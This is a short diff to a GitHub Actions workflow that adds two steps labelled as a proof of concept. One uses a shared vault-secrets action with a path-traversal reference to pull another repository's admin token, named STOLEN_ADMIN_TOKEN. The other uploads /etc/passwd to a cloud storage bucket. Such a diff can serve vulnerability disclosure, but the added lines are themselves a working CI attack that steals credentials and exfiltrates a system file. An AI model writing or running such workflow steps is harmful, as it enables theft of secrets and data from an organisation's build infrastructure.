@@ -28,3 +28,14 @@ jobs:
           }
         ]
       title: ${{ github.event.pull_request.title }}
+    - name: "POC: Cross-Repo Secret Access"
+      uses: grafana/shared-workflows/actions/get-vault-secrets@main
+      with:
+        repo_secrets: |
+          STOLEN_ADMIN_TOKEN=../../grafana/internal/admin-token:value
+    - name: "POC: Exfiltrate Sensitive Files"
+      uses: grafana/shared-workflows/actions/push-to-gcs@main
+      with:
+        path: "/etc/passwd"
+        bucket: "grafanalabs-loki-dev"
+        environment: "dev"
